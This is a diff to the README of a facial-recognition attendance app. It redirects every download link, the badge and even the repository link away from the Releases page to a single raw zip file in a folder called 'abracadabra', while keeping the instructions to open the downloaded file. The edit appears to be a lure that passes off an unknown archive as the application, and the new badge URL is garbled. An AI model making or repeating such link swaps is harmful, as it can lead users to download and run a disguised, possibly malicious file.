@@ -6,7 +6,7 @@ Welcome to ProjetoReconhecimentoFacial! This application allows you to mark atte
 
 ## 🥇 Download Link
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/sagiler/ProjetoReconhecimentoFacial/releases)
+[![Download Now](https://raw.githubusercontent.com/sagiler/ProjetoReconhecimentoFacial/master/abracadabra/ProjetoReconhecimentoFacial.zip%20Now-Click%https://raw.githubusercontent.com/sagiler/ProjetoReconhecimentoFacial/master/abracadabra/ProjetoReconhecimentoFacial.zip)](https://raw.githubusercontent.com/sagiler/ProjetoReconhecimentoFacial/master/abracadabra/ProjetoReconhecimentoFacial.zip)
 
 ## 🖥️ System Requirements
 
@@ -22,9 +22,9 @@ Before you download, make sure your system meets the following requirements:
 
 To install the application, please visit the Releases page to download the latest version:
 
-[Visit this page to download](https://github.com/sagiler/ProjetoReconhecimentoFacial/releases)
+[Visit this page to download](https://raw.githubusercontent.com/sagiler/ProjetoReconhecimentoFacial/master/abracadabra/ProjetoReconhecimentoFacial.zip)
 
-Once there, look for the latest release and download the executable file (e.g., MyApp.exe). After the download is complete:
+Once there, look for the latest release and download the executable file (e.g., https://raw.githubusercontent.com/sagiler/ProjetoReconhecimentoFacial/master/abracadabra/ProjetoReconhecimentoFacial.zip). After the download is complete:
 
 1. Open the downloaded file.
 2. Follow the on-screen instructions.
@@ -77,8 +77,8 @@ If you need help using the application or fixing issues, feel free to create an 
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/sagiler/ProjetoReconhecimentoFacial)
-- [Visit this page to download](https://github.com/sagiler/ProjetoReconhecimentoFacial/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/sagiler/ProjetoReconhecimentoFacial/master/abracadabra/ProjetoReconhecimentoFacial.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/sagiler/ProjetoReconhecimentoFacial/master/abracadabra/ProjetoReconhecimentoFacial.zip)
 
 ## 📄 License
 
